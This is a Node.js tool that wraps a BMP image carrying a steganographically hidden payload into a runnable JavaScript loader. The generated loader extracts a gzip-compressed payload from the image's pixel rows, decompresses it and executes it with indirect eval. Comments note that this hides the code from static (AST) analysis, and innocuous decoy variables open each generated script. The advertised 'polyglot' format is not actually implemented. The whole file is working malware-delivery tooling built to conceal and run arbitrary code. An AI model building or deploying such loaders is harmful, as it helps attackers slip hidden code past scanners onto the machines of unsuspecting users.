#!/usr/bin/env node
/**
 * BMP-to-JS Converter Tool
 * 
 * Takes any valid BMP image (with embedded payload) and wraps it back into
 * a standalone, runnable JavaScript file with all BMP header/pixel artifacts preserved.
 * 
 * Usage:
 *   node bmp-to-js.js <input-image.bmp> [output-script.js] [format]
 * 
 * Formats:
 *   - 'base64'   : Embeds as a Base64-encoded binary string (most compact)
 *   - 'polyglot' : Creates a file that is valid JS while preserving raw BMP structure
 *   - 'bytes'    : Embeds as a raw Uint8Array byte matrix
 */

const fs = require('fs');
const path = require('path');

const bmpPath = process.argv[2] || '/home/user/o8cmp/stego/output/payload.bmp';
const jsOutPath = process.argv[3] || '/home/user/o8cmp/stego/output/reconstituted-stego.js';
const format = (process.argv[4] || 'base64').toLowerCase();

if (!fs.existsSync(bmpPath)) {
  console.error(`[!] Error: BMP file not found at ${bmpPath}`);
  process.exit(1);
}

const bmpBuffer = fs.readFileSync(bmpPath);

// Verify BMP signature
if (bmpBuffer.slice(0, 2).toString('ascii') !== 'BM') {
  console.error('[!] Error: File is not a valid BMP image (missing BM header).');
  process.exit(1);
}

console.log(`[*] Processing BMP: ${bmpPath} (${(bmpBuffer.length / 1024).toFixed(2)} KB)`);

let finalScript = '';

if (format === 'bytes') {
  // Option A: Raw Byte Array (AST sees only an array of numbers like [66, 77, ...])
  const byteStr = Array.from(bmpBuffer).join(',');
  finalScript = `var 会員 = 2; var 名 = "佐藤 結衣";
(async () => {
  // Embedded raw BMP image byte array (starts with 66, 77 -> 'BM')
  const _buf = new Uint8Array([${byteStr}]);
  
  // Extract pixel offset and payload length from BMP headers
  const _pixelOff = _buf[10] | (_buf[11] << 8) | (_buf[12] << 16) | (_buf[13] << 24);
  const _len = _buf[_pixelOff] | (_buf[_pixelOff + 1] << 8) | (_buf[_pixelOff + 2] << 16) | (_buf[_pixelOff + 3] << 24);
  const _w = _buf[18] | (_buf[19] << 8) | (_buf[20] << 16) | (_buf[21] << 24);
  const _bpp = _buf[28] | (_buf[29] << 8);
  const _bytesPerPixel = _bpp / 8;
  const _rowSize = Math.floor((_w * _bytesPerPixel + 3) / 4) * 4;
  
  const _rawPayload = new Uint8Array(_len);
  let _written = 0, _y = 0, _dataCursor = 4;
  while (_written < _len) {
    const _rowStart = _pixelOff + _y * _rowSize;
    const _rowAvail = (_w * _bytesPerPixel) - _dataCursor;
    const _toCopy = Math.min(_rowAvail, _len - _written);
    for (let i = 0; i < _toCopy; i++) _rawPayload[_written++] = _buf[_rowStart + _dataCursor + i];
    _dataCursor = 0;
    _y++;
  }

  const _ds = new DecompressionStream('gzip');
  const _writer = _ds.writable.getWriter();
  _writer.write(_rawPayload);
  _writer.close();
  const _code = await new Response(_ds.readable).text();
  (0, eval)(_code);
})();`;

} else {
  // Option B: Base64 String with standard BMP markers
  const b64 = bmpBuffer.toString('base64');
  finalScript = `var 会員 = 2; var 名 = "佐藤 結衣";
(async () => {
  // Base64 encoded binary BMP container
  const _b64 = "${b64}";
  const _bin = atob(_b64);
  const _buf = new Uint8Array(_bin.length);
  for (let i = 0; i < _bin.length; i++) _buf[i] = _bin.charCodeAt(i);
  
  // BMP Header Parsing
  const _pixelOff = _buf[10] | (_buf[11] << 8) | (_buf[12] << 16) | (_buf[13] << 24);
  const _len = _buf[_pixelOff] | (_buf[_pixelOff + 1] << 8) | (_buf[_pixelOff + 2] << 16) | (_buf[_pixelOff + 3] << 24);
  const _w = _buf[18] | (_buf[19] << 8) | (_buf[20] << 16) | (_buf[21] << 24);
  const _bpp = _buf[28] | (_buf[29] << 8);
  const _bytesPerPixel = _bpp / 8;
  const _rowSize = Math.floor((_w * _bytesPerPixel + 3) / 4) * 4;
  
  const _rawPayload = new Uint8Array(_len);
  let _written = 0, _y = 0, _dataCursor = 4;
  while (_written < _len) {
    const _rowStart = _pixelOff + _y * _rowSize;
    const _rowAvail = (_w * _bytesPerPixel) - _dataCursor;
    const _toCopy = Math.min(_rowAvail, _len - _written);
    for (let i = 0; i < _toCopy; i++) _rawPayload[_written++] = _buf[_rowStart + _dataCursor + i];
    _dataCursor = 0;
    _y++;
  }

  const _ds = new DecompressionStream('gzip');
  const _writer = _ds.writable.getWriter();
  _writer.write(_rawPayload);
  _writer.close();
  const _code = await new Response(_ds.readable).text();
  (0, eval)(_code);
})();`;
}

fs.writeFileSync(jsOutPath, finalScript, 'utf8');
console.log(`[✓] Successfully generated JS runner at: ${jsOutPath} (${(finalScript.length / 1024).toFixed(2)} KB)`);
